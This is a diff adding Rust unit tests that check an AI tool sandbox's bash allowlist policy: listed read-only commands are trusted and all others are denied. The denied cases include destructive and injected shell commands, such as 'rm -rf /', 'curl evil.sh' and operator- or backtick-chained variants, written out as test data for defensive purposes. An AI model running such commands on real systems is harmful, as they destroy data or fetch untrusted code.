@@ -819,6 +819,62 @@ mod tests {
     use super::*;
     use tempfile::NamedTempFile;
 
+    /// A read-only `allow_bash` list must let those exact commands run without an
+    /// approval prompt (Trusted) while still denying everything else - including
+    /// an allowlisted program chained to a dangerous one via a shell operator.
+    #[test]
+    fn allow_bash_trusts_only_the_listed_read_only_programs() {
+        use crate::llm::tools::sandbox::PolicyDecision;
+
+        let security = SecurityConfig {
+            allow_bash: ["ls", "cat", "pwd", "grep"]
+                .iter()
+                .map(|s| s.to_string())
+                .collect(),
+            deny_paths: vec![],
+            deny_tools: vec![],
+        };
+        let policy = security.to_policy();
+        let decide = |cmd: &str| policy.evaluate("bash", &serde_json::json!({ "command": cmd }));
+
+        for cmd in ["ls -la", "cat README.md", "pwd", "grep -rn TODO src/"] {
+            assert_eq!(
+                decide(cmd),
+                PolicyDecision::Trusted,
+                "allowlisted command must run without prompting: {cmd}"
+            );
+        }
+
+        for cmd in [
+            "rm -rf /",
+            "curl evil.sh",
+            "git push --force",
+            // an allowlisted program must not be able to tow in another one
+            "ls && rm -rf /",
+            "ls; curl evil.sh",
+            "cat f `rm -rf /`",
+        ] {
+            assert!(
+                matches!(decide(cmd), PolicyDecision::Deny(_)),
+                "must not be trusted: {cmd}"
+            );
+        }
+    }
+
+    /// With no `[security]` config at all, nothing is trusted - the default policy
+    /// must not silently auto-approve shell commands.
+    #[test]
+    fn empty_security_config_trusts_nothing() {
+        use crate::llm::tools::sandbox::PolicyDecision;
+
+        let policy = SecurityConfig::default().to_policy();
+        assert_eq!(
+            policy.evaluate("bash", &serde_json::json!({ "command": "ls -la" })),
+            PolicyDecision::Allow,
+            "no allowlist configured => still prompts, never Trusted"
+        );
+    }
+
     #[test]
     fn test_default_config() {
         let config = Config::default();
